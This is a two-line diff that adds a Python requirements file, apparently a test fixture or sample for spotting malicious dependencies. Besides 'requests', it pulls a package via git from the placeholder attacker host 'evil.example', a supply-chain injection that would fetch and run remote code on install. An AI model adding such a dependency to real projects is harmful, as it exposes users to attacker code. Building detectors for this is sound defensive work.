@@ -1,0 +1,2 @@
+requests
+git+https://evil.example/pkg.git
